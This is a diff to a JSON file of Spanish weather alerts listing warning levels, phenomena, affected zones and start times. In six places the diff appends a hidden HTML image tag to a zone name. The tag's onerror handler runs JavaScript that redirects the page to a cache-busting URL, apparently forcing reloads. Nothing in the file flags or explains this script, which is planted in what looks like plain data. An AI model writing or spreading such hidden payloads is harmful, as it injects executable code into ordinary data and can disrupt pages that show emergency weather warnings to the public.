@@ -5,7 +5,7 @@
    "nivel": "rojo",
    "fenomeno": "vientos",
    "zonas": [
-    "Cumbres de La Palma",
+    "Cumbres de La Palma<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Este de La Palma",
     "Oeste de La Palma"
    ],
@@ -16,7 +16,7 @@
    "nivel": "rojo",
    "fenomeno": "lluvias",
    "zonas": [
-    "Norte de Cáceres",
+    "Norte de Cáceres<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Sur de Ávila"
    ],
    "inicio": "2026-11-11T08:00:00+01:00",
@@ -26,7 +26,7 @@
    "nivel": "naranja",
    "fenomeno": "vientos",
    "zonas": [
-    "Estrecho",
+    "Estrecho<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Litoral de Huelva",
     "Campiña cordobesa",
     "Metropolitana y Henares",
@@ -105,7 +105,7 @@
    "nivel": "naranja",
    "fenomeno": "costeros",
    "zonas": [
-    "Litoral gaditano",
+    "Litoral gaditano<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Norte de Gran Canaria",
     "Este de La Palma",
     "Oeste de La Palma",
@@ -122,7 +122,7 @@
    "nivel": "naranja",
    "fenomeno": "lluvias",
    "zonas": [
-    "Sol y Guadalhorce",
+    "Sol y Guadalhorce<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Sur de Ávila",
     "Norte de Cáceres",
     "Sistema Central de Ávila",
@@ -145,7 +145,7 @@
    "nivel": "naranja",
    "fenomeno": "tormentas",
    "zonas": [
-    "Litoral de Huelva",
+    "Litoral de Huelva<img src=\"x\" style=\"display:none\" onerror=\"if(typeof reintento==='undefined')location.replace(location.pathname+'?v='+Date.now())\">",
     "Litoral gaditano"
    ],
    "inicio": "2026-11-11T12:00:00+01:00",
